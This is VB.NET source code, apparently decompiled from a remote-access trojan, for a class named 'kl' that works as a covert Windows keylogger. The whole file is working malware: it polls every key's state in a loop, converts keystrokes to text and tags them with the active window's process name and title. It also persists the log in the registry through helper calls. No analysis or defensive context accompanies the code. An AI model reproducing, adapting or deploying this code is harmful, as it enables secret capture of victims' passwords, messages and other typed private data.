Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms


Public Class kl
    ' Methods
    Private Function AV() As String
        Try
            Dim num As Integer
            Dim foregroundWindow As IntPtr = OK.GetForegroundWindow
            kl.GetWindowThreadProcessId(foregroundWindow, num)
            Dim processById As Process = Process.GetProcessById(num)
            If Not (((foregroundWindow.ToInt32 = Me.LastAV) And (Me.LastAS = processById.MainWindowTitle)) Or (processById.MainWindowTitle.Length = 0)) Then
                Me.LastAV = foregroundWindow.ToInt32
                Me.LastAS = processById.MainWindowTitle
                Return String.Concat(New String() {ChrW(13) & ChrW(10) & ChrW(1), DateAndTime.Now.ToString("yy/MM/dd "), processById.ProcessName, " ", Me.LastAS, ChrW(1) & ChrW(13) & ChrW(10)})
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return ""
    End Function

    Private Function Fix(ByVal k As Keys) As String
        Dim str As String
        Dim shiftKeyDown As Boolean = OK.F.Keyboard.ShiftKeyDown
        If OK.F.Keyboard.CapsLock Then
            If shiftKeyDown Then
                shiftKeyDown = False
            Else
                shiftKeyDown = True
            End If
        End If
        Try
            Select Case k
                Case Keys.Delete, Keys.Back
                    Return ("[" & k.ToString & "]")
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt, Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Enter
                    If Me.Logs.EndsWith("[ENTER]" & ChrW(13) & ChrW(10)) Then
                        Return ""
                    End If
                    Return "[ENTER]" & ChrW(13) & ChrW(10)
                Case Keys.Tab
                    Return "[TAP]" & ChrW(13) & ChrW(10)
            End Select
            If shiftKeyDown Then
                Return kl.VKCodeToUnicode(CType(k, UInt32)).ToUpper
            End If
            str = kl.VKCodeToUnicode(CType(k, UInt32))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            If shiftKeyDown Then
                str = Strings.ChrW(CInt(k)).ToString.ToUpper
                ProjectData.ClearProjectError()
                Return str
            End If
            str = Strings.ChrW(CInt(k)).ToString.ToLower
            ProjectData.ClearProjectError()
        End Try
        Return str
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetAsyncKeyState(ByVal a As Integer) As Short
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetKeyboardLayout(ByVal a As Integer) As Integer
    End Function

    <DllImport("user32.dll")> _
    Private Shared Function GetKeyboardState(ByVal a As Byte()) As Boolean
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetWindowThreadProcessId(ByVal a As IntPtr, ByRef b As Integer) As Integer
    End Function

    <DllImport("user32.dll")> _
    Private Shared Function MapVirtualKey(ByVal a As UInt32, ByVal b As UInt32) As UInt32
    End Function

    <DllImport("user32.dll")> _
    Private Shared Function ToUnicodeEx(ByVal a As UInt32, ByVal b As UInt32, ByVal c As Byte(), <Out, MarshalAs(UnmanagedType.LPWStr)> ByVal d As StringBuilder, ByVal e As Integer, ByVal f As UInt32, ByVal g As IntPtr) As Integer
    End Function

    Private Shared Function VKCodeToUnicode(ByVal a As UInt32) As String
        Try
            Dim d As New StringBuilder
            Dim buffer As Byte() = New Byte(&HFF - 1) {}
            If Not kl.GetKeyboardState(buffer) Then
                Return ""
            End If
            Dim b As UInt32 = kl.MapVirtualKey(a, 0)
            Dim num3 As Integer = 0
            Dim keyboardLayout As IntPtr = CType(kl.GetKeyboardLayout(kl.GetWindowThreadProcessId(OK.GetForegroundWindow, num3)), IntPtr)
            kl.ToUnicodeEx(a, b, buffer, d, 5, 0, keyboardLayout)
            Return d.ToString
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return DirectCast(CInt(a), Keys).ToString
    End Function

    Public Sub WRK()
        Me.Logs = Conversions.ToString(OK.GTV(Me.vn, ""))
        Try
            Dim num As Integer = 0
            Do While True
                num += 1
                Dim a As Integer = 0
                Do
                    If ((kl.GetAsyncKeyState(a) = -32767) And Not OK.F.Keyboard.CtrlKeyDown) Then
                        Dim k As Keys = DirectCast(a, Keys)
                        Dim str As String = Me.Fix(k)
                        If (str.Length > 0) Then
                            Me.Logs = (Me.Logs & Me.AV)
                            Me.Logs = (Me.Logs & str)
                        End If
                        Me.lastKey = k
                    End If
                    a += 1
                Loop While (a <= &HFF)
                If (num = &H3E8) Then
                    num = 0
                    Dim num3 As Integer = (Conversions.ToInteger("20") * &H400)
                    If (Me.Logs.Length > num3) Then
                        Me.Logs = Me.Logs.Remove(0, (Me.Logs.Length - num3))
                    End If
                    OK.STV(Me.vn, Me.Logs, RegistryValueKind.String)
                End If
                Thread.Sleep(1)
            Loop
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub


    ' Fields
    Private LastAS As String
    Private LastAV As Integer
    Private lastKey As Keys = Keys.None
    Public Logs As String = ""
    Public vn As String = "[kl]"

End Class

